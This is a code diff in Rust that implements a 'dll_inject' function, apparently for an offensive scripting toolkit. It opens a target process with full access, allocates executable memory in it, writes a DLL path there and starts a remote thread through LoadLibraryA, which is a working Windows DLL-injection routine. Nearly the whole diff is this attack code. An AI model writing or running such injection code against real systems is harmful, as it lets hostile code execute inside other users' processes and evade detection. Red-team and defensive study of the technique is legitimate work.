@@ -1,10 +1,46 @@
+use std::ffi::c_void;
+use std::{time, thread, process};
+
 use anyhow::Result;
 use starlark::values::none::NoneType;
 use sysinfo::{ProcessExt,System,SystemExt,PidExt};
-
+use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
+use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+use windows_sys::Win32::System::Threading::OpenProcess;
+use windows_sys::Win32::System::Threading::PROCESS_ALL_ACCESS;
+use windows_sys::Win32::System::Memory::VirtualAllocEx;
+use windows_sys::Win32::System::Memory::{MEM_RESERVE,MEM_COMMIT,PAGE_EXECUTE_READWRITE};
+use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+use windows_sys::Win32::System::Threading::CreateRemoteThread;
+use windows_sys::Win32::Foundation::CloseHandle;
 
 pub fn dll_inject(dll_path: String, pid: u32) -> Result<NoneType> {
-    unimplemented!("Method unimplemented")
+    unsafe {
+        // Get the kernel32.dll base address
+        let h_kernel32 = GetModuleHandleA("kernel32.dll\0".as_bytes().as_ptr() as *const u8);
+        // Get the address of the kernel function LoadLibraryA
+        let lb = GetProcAddress(h_kernel32, "LoadLibraryA\0".as_bytes().as_ptr() as *const u8).unwrap();
+
+        // Open a handle to the remote process
+        let ph = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+
+        // Allocate memory in the remote process that we'll copy the DLL path string to.
+        let rb = VirtualAllocEx(ph, 0 as *const c_void, dll_path.len()+1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+        // Write the DLL path into the remote processes newly allocated memory
+        let write_proccess_memory_res = WriteProcessMemory(ph, rb, dll_path.as_bytes().as_ptr() as *const c_void, dll_path.len(), 0 as *mut usize);
+
+        let rt = CreateRemoteThread(ph, 0 as *const SECURITY_ATTRIBUTES, 0, Some(std::mem::transmute::<_, extern "system" fn(_) -> _>(lb)), rb, 0, 0 as *mut u32);
+        CloseHandle(ph);
+      
+        // println!("{}", process::id());
+        // println!("kernel32 {:?}", h_kernel32 as *const isize);
+        // println!("lb {:?}", lb as *const ());
+        // println!("ph {:?}", ph as *const isize);
+        // println!("rb {:?}", rb as *const c_void);
+        // println!("phmodule {:?}", phmodule);
+    }
+    Ok(NoneType)
 }
 
 #[cfg(test)]
